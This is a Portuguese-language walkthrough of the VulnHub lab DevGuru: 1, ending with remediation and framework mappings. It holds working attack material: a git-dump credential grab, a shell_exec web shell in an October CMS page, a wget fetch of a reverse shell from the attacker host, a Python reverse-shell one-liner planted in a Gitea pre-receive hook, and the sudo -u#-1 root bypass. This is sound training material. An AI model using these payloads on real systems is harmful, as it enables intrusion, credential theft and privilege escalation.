# DevGuru: 1 — Quando o Servidor de Dev Vira Shell de Root

> Um desenvolvedor deixou todo o histórico Git de um site CMS de produção acessível pela internet. Esse único erro nos entregou credenciais de banco de dados, painel admin, pivô lateral por um servidor Git self-hosted, e finalmente root via uma falha de sudo com quase uma década de idade. Apertem os cintos. ԅ(≖‿≖ԅ)

---

| Campo | Valor |
|---|---|
| **Nível** | Difícil |
| **VM Alvo** | DevGuru: 1 |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/devguru-1,620/ |
| **Técnicas** | Exposição de repositório Git, abuso de credenciais no Adminer, RCE PHP no October CMS, abuso de pre-receive hook no Gitea, CVE-2019-14287 bypass do sudo |
| **CVEs** | CVE-2019-14287 (sudo < 1.8.28, bypass da diretiva `!root`) |
| **Grupos APT** | APT28 (acesso a repositório de código para coleta de credenciais), FIN7 (cadeias de exploração de apps web expostos) |

---

## Resumo do Ataque

```
[Atacante]
    |
    v
Scan Nmap: portas 22, 80 (October CMS), 8585 (Gitea)
    |
    v
/.git/ exposto → dump com GitTools → config/database.php: credenciais do DB
    |
    v
Adminer (http://devguru.local/adminer.php) → login MySQL
    |
    v
Tabela backend_users: hash bcrypt substituído → login no CMS admin como frank
    |
    v
Snippet PHP no October CMS: shell_exec → RCE → shell reverso (www-data)
    |
    v
/var/backup/app.ini.bak → credenciais do DB Gitea → atualizar hash do usuário Gitea
    |
    v
Pre-receive hook no Gitea: shell reverso Python → pivô lateral para frank
    |
    v
sudo -l: (ALL, !root) NOPASSWD: /usr/bin/sqlite3
    |
    v
CVE-2019-14287: sudo -u#-1 sqlite3 → shell root → /root/root.txt
```

---

## Metodologia

1. Reconhecimento com nmap e configuração do virtual host.
2. Dump do repositório Git via `/.git/` exposto usando GitTools.
3. Acesso admin ao October CMS substituindo hash bcrypt no Adminer.
4. Execução remota de código via snippet PHP na página do CMS, obtendo shell como `www-data`.
5. Descoberta de credenciais do Gitea em arquivo de backup, substituição de hash para acesso lateral.
6. Abuso de pre-receive hook no Gitea para pivô para o usuário `frank`.
7. Escalação de privilégios via CVE-2019-14287 para root.

---

## Passo 1 — Reconhecimento e Configuração do Virtual Host

**Por que isso importa:** antes de tocar em qualquer coisa, mapeamos a superfície de ataque. Três portas significam três pontos de entrada potenciais, e o hostname importa porque o October CMS pode usar roteamento por virtual host para decidir o que servir.

```bash
# Scan completo de portas com detecção de serviço/versão e scripts padrão
# -p-: todas as 65535 portas; -A: detecção de SO + versão + scripts + traceroute
nmap -p- -A $ALVO
```

Saída esperada (resumida):

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1
80/tcp   open  http    Apache/2.4.29 (October CMS)
8585/tcp open  http    Gitea (serviço Git)
```

Três portas abertas: SSH na 22, October CMS na 80, e Gitea na 8585. Massa! Adicionar o hostname em `/etc/hosts`:

```
192.168.1.32    devguru.local
```

Abrir `http://devguru.local/` e confirmar o October CMS. Agora checar o óbvio: `/.git/` está acessível?

```bash
curl -s -o /dev/null -w "%{http_code}" http://devguru.local/.git/HEAD
# 200 significa que o diretório .git está totalmente exposto, mano, que mancada do cara que fez o deploy
```

**Nota real:** Em 2020, um pesquisador de segurança encontrou diretórios `/.git/` expostos em milhares de sites de produção usando Google dorks simples. Várias intrusões do APT28 começaram exatamente com essa técnica, coletando credenciais de arquivos de configuração versionados.

**MITRE ATT&CK:** T1213 — Dados de Repositórios de Informação

---

## Passo 2 — Dump do Repositório Git

**Por que isso importa:** um diretório `/.git/` exposto não é apenas um único arquivo vazado. É o armazenamento completo de objetos do repositório, incluindo histórico de commits, arquivos de configuração, e potencialmente segredos que foram commitados e depois deletados. O GitTools reconstrói a árvore de trabalho completa a partir dele.

```bash
# GitTools: gitdumper busca todos os objetos .git via HTTP
# extractor reconstrói a árvore de trabalho a partir desses objetos
git clone https://github.com/internetwache/GitTools.git
cd GitTools/Dumper
./gitdumper.sh http://devguru.local/.git/ /tmp/devguru-dump

cd ../Extractor
./extractor.sh /tmp/devguru-dump /tmp/devguru-src
```

**Alternativa:** `git-dumper` (pip install git-dumper) funciona da mesma forma com um único comando.

Navegar no código recuperado:

```bash
grep -r "DB_PASSWORD\|DB_USER\|password" /tmp/devguru-src --include="*.php" -l
cat /tmp/devguru-src/*/config/database.php
```

Credenciais recuperadas:

```
DB_USERNAME=october
DB_PASSWORD=SQ66EBYx4GT3byXH
DB_DATABASE=octoberdb
```

Também presente no código recuperado: `adminer.php` na raiz web. Isso é ouro puro, caramba. ( ͡° ͜ʖ ͡°)

**Nota real:** O vazamento de código-fonte da Samsung em 2022 incluiu repositórios Git com credenciais embutidas. Extração no estilo GitTools é exatamente o que atores de ameaça usam para reconhecimento de cadeia de suprimentos.

**MITRE ATT&CK:** T1213 — Dados de Repositórios de Informação, T1552.001 — Credenciais em Arquivos

---

## Passo 3 — Acesso Admin ao October CMS via Adminer

**Por que isso importa:** temos credenciais do banco, mas não a senha admin do CMS. O Adminer é um gerenciador de banco de dados PHP de arquivo único que nos permite manipular diretamente qualquer tabela. A tabela `backend_users` armazena hashes bcrypt; substituímos o hash de frank por um que conhecemos.

```bash
# Gerar um hash bcrypt para uma senha conhecida usando htpasswd
# -B: usar bcrypt; -n: saída para stdout; -b: receber senha pela linha de comando
htpasswd -nbB fake rajchandel | cut -d: -f2
# Saída (exemplo): $2y$05$Sn6xmjXl3j9hNDLW3sKAHOoJLq/3Vj3nfChIAGg4...<hash>
```

Abrir `http://devguru.local/adminer.php` e fazer login:

```
Servidor:  localhost
Usuário:   october
Senha:     SQ66EBYx4GT3byXH
Banco:     octoberdb
```

Ir para a tabela `backend_users`, encontrar a linha de `frank` e atualizar a coluna `password` com o novo hash bcrypt. Fazer login em `http://devguru.local/backend` como `frank:rajchandel`.

**Alternativa:** usar o CLI MySQL via `mysql -h devguru.local -u october -pSQ66EBYx4GT3byXH octoberdb` e executar o UPDATE diretamente.

**Nota real:** O grupo FIN7 usou painéis de administração de banco de dados estilo Adminer expostos durante ataques Magecart para injetar JavaScript skimmers diretamente no conteúdo de banco de dados de CMS.

**MITRE ATT&CK:** T1078 — Contas Válidas, T1190 — Exploit de Aplicação Voltada ao Público

---

## Passo 4 — RCE via Snippet PHP no October CMS

**Por que isso importa:** o October CMS permite código PHP dentro de "Componentes" de página. Isso não é uma vulnerabilidade por si só, mas é uma feature que se torna catastrófica quando usuários arbitrários têm acesso admin. Qualquer CMS que executa código server-side a partir do painel admin é uma máquina de RCE com um clique quando o painel está comprometido.

Navegar para **CMS > Páginas > Nova Página**. Na seção PHP, adicionar:

```php
function onStart() {
    $this->page["myVar"] = shell_exec($_GET['cmd']);
}
```

Na seção de template Twig, adicionar:

```twig
{{ page.myVar }}
```

Salvar e testar:

```
http://devguru.local/mypage?cmd=id
# Esperado: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Cara, isso é RCE confirmado! Agora armar:

```bash
# Atacante: servir um shell reverso PHP (usar php-reverse-shell.php do pentestmonkey)
python3 -m http.server 8000

# Entregar via parâmetro cmd:
# http://devguru.local/mypage?cmd=wget%20http%3A%2F%2F$LHOST%3A8000%2Fshell.php%20-O%20/tmp/shell.php

# Iniciar o listener:
nc -lvnp $LPORT

# Disparar o shell:
# http://devguru.local/mypage?cmd=php%20/tmp/shell.php
```

Shell chega como `www-data`. ᕕ( ᐛ )ᕗ

**Alternativa:** usar one-liner Python ou shell reverso Bash /dev/tcp em vez do arquivo PHP.

**Nota real:** CWE-94 (Injeção de Código) via mecanismos de template de CMS é um dos vetores de acesso inicial mais comuns em brechas de e-commerce. Os ataques de 2023 ao Magento/Adobe Commerce documentados pela Sansec injetaram snippets PHP em blocos CMS para coletar dados de pagamento.

**MITRE ATT&CK:** T1059.004 — Interpretador de Comando e Script: Shell Unix, T1505.003 — Componente de Software de Servidor: Web Shell

---

## Passo 5 — Descoberta de Credenciais do Gitea em Backup

**Por que isso importa:** o `www-data` consegue ler certos arquivos do sistema. Arquivos de backup armazenados fora da raiz web, mas legíveis pelo processo web, são uma mina de ouro clássica de pós-exploração. O padrão `*.bak`, `*.old`, `*.backup` em `/var/backup/` vale checar em qualquer Linux.

```bash
cat /var/backup/app.ini.bak
```

Saída (trecho relevante):

```ini
[database]
DB_TYPE             = mysql
HOST                = 127.0.0.1:3306
NAME                = gitea
USER                = gitea
PASSWD              = UfFPTF8C8jjxVF2m
```

Agora atualizar o hash de senha de frank no Gitea para algo que conhecemos:

```bash
mysql -u gitea -pUfFPTF8C8jjxVF2m gitea
```

```sql
SELECT name, passwd FROM user;
UPDATE user SET passwd='<bcrypt_de_rajchandel>', passwd_hash_algo='bcrypt' WHERE name='frank';
```

Fazer login no Gitea em `http://devguru.local:8585` como `frank:rajchandel`.

**MITRE ATT&CK:** T1552 — Credenciais Não Seguras, T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 6 — Abuso de Pre-Receive Hook no Gitea (Movimento Lateral)

**Por que isso importa:** hooks Git server-side do Gitea executam comandos shell arbitrários no servidor como o proprietário do processo Gitea. Pre-receive hooks executam antes de um commit ser aceito. Isso torna qualquer admin Gitea com acesso ao repositório capaz de executar código no SO subjacente. Isso não é uma misconfiguration específica do Gitea; é fundamental para como hooks Git funcionam.

No Gitea, navegar para: **repositório devguru-website > Configurações > Git Hooks > pre-receive**.

Adicionar o seguinte hook:

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$LHOST",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

Iniciar um novo listener:

```bash
nc -lvnp $LPORT
```

Disparar o hook: editar qualquer arquivo (ex.: `README.md`) pela interface web do Gitea e commitar. O pre-receive hook dispara, e um shell chega como `frank`.

```bash
cat /home/frank/user.txt
```

**Nota real:** Em 2021, o abuso de pipeline CI/CD (primo conceitual do abuso de hook Git) foi usado no ataque à cadeia de suprimentos SolarWinds pelo APT29/Cozy Bear para injetar código malicioso em pipelines de build. Proteger hooks server-side é um item específico no framework SLSA (Supply Chain Levels for Software Artifacts).

**MITRE ATT&CK:** T1072 — Ferramentas de Implantação de Software, T1059.006 — Interpretador de Comando e Script: Python

---

## Passo 7 — Escalação de Privilégios via CVE-2019-14287

**Por que isso importa:** a diretiva `!root` do sudo é destinada a impedir que um usuário execute um comando como root. O CVE-2019-14287 mostra que especificar UID `-1` contorna completamente essa verificação, porque o kernel mapeia UID -1 (um valor sem sinal) para UID 0 (root). Isso afeta todas as versões de sudo anteriores à 1.8.28.

```bash
# Verificar privilégios sudo e versão do sudo
sudo -l
sudo --version
```

Saída de `sudo -l`:

```
(ALL, !root) NOPASSWD: /usr/bin/sqlite3
```

A cláusula `!root` deveria proibir execução como root. Com CVE-2019-14287:

```bash
# -u#-1 especifica UID -1, que resolve para root (UID 0) devido ao wraparound de inteiros
# o comando .shell do sqlite3 spawna um shell
sudo -u#-1 sqlite3 /dev/null '.shell /bin/bash'
```

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
```

Facinho assim, root! (☞ﾟヮﾟ)☞

**Alternativa:** `sudo -u#-1 sqlite3 /dev/null '.shell id'` para verificar antes de spawnar o shell.

**Nota real:** O CVE-2019-14287 foi corrigido em outubro de 2019. Em 2023, scans do Shodan ainda encontravam milhares de servidores com acesso à internet rodando sudo < 1.8.28. Essa vuln está no catálogo de Vulnerabilidades Conhecidas Exploradas (KEV) da CISA.

**MITRE ATT&CK:** T1548.003 — Abuso de Mecanismo de Controle de Elevação: Sudo e Cache Sudo

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Usado/Crackeado |
|---|---|---|---|
| Credencial DB | `october:SQ66EBYx4GT3byXH` | `config/database.php` (dump git) | Usado para login no Adminer |
| Hash bcrypt CMS | Substituído em `backend_users` | Adminer — `octoberdb.backend_users` | Usado para login como `frank` no October CMS |
| Credencial DB Gitea | `gitea:UfFPTF8C8jjxVF2m` | `/var/backup/app.ini.bak` | Usado para atualizar hash do usuário Gitea |
| Flag de usuário | `/home/frank/user.txt` | Obtida após RCE via hook Gitea | Prova do usuário `frank` |
| Flag de root | `/root/root.txt` | Obtida após sudo CVE-2019-14287 | Prova final |

---

## Lições Aprendidas

| Nº | Achado | Relevância no Mundo Real | Conclusão |
|---|---|---|---|
| 1 | Diretório `.git/` exposto em servidor web de produção | Visto em milhares de sites de produção; usado para coleta de credenciais pelo APT28 | Bloquear `/.git/` no nível do servidor web; implantar na raiz web apenas artefatos de build, não o diretório VCS |
| 2 | Adminer deixado acessível em caminho adivinhável | Painéis de admin de banco expostos na internet são vetor direto de violação de dados | Remover o Adminer após uso; se necessário, proteger com allowlist de IP e autenticação |
| 3 | CMS permite execução arbitrária de PHP em templates | Qualquer CMS com execução de template server-side é uma máquina de RCE se o painel admin for comprometido | Implementar regra WAF bloqueando execução PHP em conteúdo de template; sandboxar renderização de templates |
| 4 | Arquivo de backup com credenciais legível pelo processo web | Falha de defesa em profundidade: segredos em arquivos de backup compensam a falta de gerenciamento de segredos | Usar gerenciadores de segredos (HashiCorp Vault, AWS Secrets Manager); nunca armazenar credenciais em arquivos de backup legíveis por processos de aplicação |
| 5 | Execução de hook server-side do Gitea | Abuso de hook CI/CD é técnica documentada de ataque à cadeia de suprimentos (MITRE T1072) | Restringir edição de hooks Git a proprietários de repositório; revisar hooks em auditorias de segurança |
| 6 | sudo < 1.8.28 com diretiva `!root` | CVE-2019-14287 está no CISA KEV; explorado ativamente em fases de pós-exploração | Corrigir o sudo; auditar entradas `sudo -l` para padrões `!root` |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Dados de Repositórios de Informação | T1213 |
| Acesso Inicial | Acesso a Credenciais | Credenciais em Arquivos | T1552.001 |
| Acesso Inicial | Acesso Inicial | Exploração de Aplicação Voltada ao Público | T1190 |
| Execução | Evasão de Defesa | Contas Válidas | T1078 |
| Execução | Execução | Interpretador de Comando e Script: Shell Unix | T1059.004 |
| Persistência | Persistência | Componente de Software de Servidor: Web Shell | T1505.003 |
| Movimento Lateral | Movimento Lateral | Ferramentas de Implantação de Software (hook Git) | T1072 |
| Execução | Execução | Interpretador de Comando e Script: Python | T1059.006 |
| Escalação de Privilégios | Escalação de Privilégios | Abuso de Mecanismo de Controle de Elevação: Sudo | T1548.003 |
| Descoberta | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |

---

## Remediação e Contenção

### Correções Técnicas

1. Bloquear acesso a `/.git/` no nível do servidor web. Para Apache: `<DirectoryMatch "^(.*/)?\.git/">Deny from all</DirectoryMatch>`. Para Nginx: `location ~ /\.git { deny all; }`.
2. Remover o Adminer da raiz web após tarefas de configuração do banco de dados. Se mantido, restringir acesso por IP.
3. Desabilitar execução de PHP nos snippets de página do October CMS via configuração de permissões do CMS; executar o CMS em um container sem privilégios.
4. Armazenar todos os segredos em variáveis de ambiente injetadas em runtime; usar HashiCorp Vault ou AWS Secrets Manager. Nunca commitar credenciais no controle de versão.
5. Restringir permissões de arquivos de backup: `chown root:root /var/backup/app.ini.bak && chmod 600 /var/backup/app.ini.bak`.
6. Auditar hooks server-side do Gitea; remover quaisquer pre-receive hooks que executem comandos shell; restringir edição de hooks a administradores de repositório.
7. Atualizar sudo para versão 1.8.28 ou superior: `apt-get upgrade sudo`.
8. Auditar `sudo -l` para todos os usuários não-root; remover padrões `!root` em instalações antigas do sudo.

### Se Você Encontrar Isso no Seu Ambiente

- Rotacionar imediatamente todas as credenciais encontradas no diretório `/.git/` exposto.
- Desabilitar o Adminer ou restringir por IP.
- Verificar a tabela `backend_users` para mudanças de senha não autorizadas.
- Auditar hooks do Gitea em busca de shells reversos injetados.
- Revisar `/var/backup/` em busca de arquivos de leitura pública contendo credenciais.
- Verificar `/var/log/auth.log` para uso inesperado de `su` ou `sudo`.

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventário de diretórios expostos na web e componentes do CMS |
| Proteger | Controle de Acesso | Hardening do servidor web: bloquear `/.git/`, desabilitar Adminer, gerenciamento de segredos |
| Detectar | Anomalias e Eventos | Monitoramento de integridade de arquivos na raiz web; alertas sobre uso anormal de `sudo` |
| Responder | Planejamento de Resposta | Rotação de credenciais, auditoria de hooks, revisão de arquivos de backup |
| Recuperar | Planejamento de Recuperação | Restaurar de backup limpo; verificar ausência de mecanismos de persistência |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Aplicação de Acesso | Restringir acesso ao painel admin de banco por IP e autenticação |
| CM-6 | Configurações | Forçar configs de servidor web que bloqueiem exposição de `/.git/` |
| IA-5 | Gestão de Autenticadores | Rotacionar credenciais encontradas em repositórios expostos |
| SI-2 | Remediação de Falhas | Corrigir sudo (CVE-2019-14287) como parte do programa de gestão de vulnerabilidades |
| AU-2 | Log de Eventos | Registrar e alertar sobre invocações de `sudo -u#-1` |

### CISA KEV

O CVE-2019-14287 (escalação de privilégios sudo < 1.8.28) foi adicionado ao catálogo de Vulnerabilidades Conhecidas Exploradas da CISA. Organizações cobertas pela CISA BOD 22-01 devem remediar dentro do prazo mandatário.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gestão de Ativos, Mudanças e Configuração (ASSET) | Gerenciar Ativos de TI | MIL-2 |
| Gestão de Identidade e Acesso (ACCESS) | Gerenciar Privilégios | MIL-3 |
| Consciência Situacional (SITUATION) | Realizar Logging | MIL-2 |

### MITRE D3FEND

- D3-ACH: Hardening de Configuração de Aplicação (desabilitar Adminer, restringir `/.git/`)
- D3-PRA: Prevenção de Spoofing de Argumento de Processo (patch do sudo)
- D3-SAOR: Monitoramento de Repositório de Código-Fonte

---

## Considerações Finais

Muito respeito ao criador do DevGuru por construir uma cadeia de ataque que flui tão naturalmente de um erro para o próximo. A exposição do `/.git/` não é algum caso extremo exótico; é um dos achados mais comuns em pentests reais. Encadear isso com o Adminer, depois RCE no CMS, depois um arquivo de backup, depois um hook Git, e finalmente uma CVE do sudo cria um cenário que genuinamente espelha como brechas de produção se desenrolam.

Se esta máquina te frustrou em algum momento, essa frustração é o lab funcionando como pretendido. Paciência real de atacante é recompensada. Defensores reais aprendem exatamente com essa cadeia.

Continuem hackeando, continuem aprendendo, e nunca implantem o diretório `.git/` em produção. ಠᴗಠ

Thanks guys!! (❍ᴥ❍ʋ)
